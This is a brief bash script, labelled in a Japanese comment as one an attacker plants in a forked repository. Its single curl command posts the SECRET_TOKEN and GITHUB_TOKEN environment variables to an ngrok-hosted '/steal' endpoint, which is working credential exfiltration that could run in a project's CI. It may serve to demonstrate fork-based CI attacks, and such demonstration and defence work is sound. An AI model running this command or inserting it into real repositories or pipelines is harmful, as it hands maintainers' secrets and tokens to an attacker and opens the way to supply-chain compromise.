#!/bin/bash
# 攻撃者がフォークに仕込むスクリプト

curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.app/steal \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
